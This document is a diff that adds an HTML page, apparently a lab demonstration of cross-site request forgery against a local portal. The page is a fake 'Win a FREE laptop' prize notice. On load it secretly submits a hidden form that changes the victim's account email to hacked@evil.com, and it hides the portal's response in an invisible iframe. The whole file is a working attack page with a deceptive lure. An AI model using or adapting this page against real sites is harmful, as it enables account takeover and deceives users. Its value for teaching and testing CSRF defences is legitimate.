@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Win a FREE laptop!</title></head>
+<!-- Attacker page. On load, the hidden form auto-submits into an invisible
+     iframe (target="sink"), so the portal's response loads OFF-SCREEN and this
+     "Congratulations" page stays showing. The victim sees nothing change; their
+     email is silently updated using their logged-in session cookie. -->
+<body onload="document.getElementById('evil').submit()" style="font-family:Arial;padding:40px">
+  <h2>Congratulations! You won a FREE laptop &mdash; claiming your prize...</h2>
+  <p>Please wait while we prepare your reward. Do not close this page.</p>
+  <form id="evil" action="http://localhost:3001/update-email" method="POST" target="sink">
+    <input type="hidden" name="email" value="hacked@evil.com">
+  </form>
+  <iframe name="sink" style="display:none"></iframe>
+</body>
+</html>
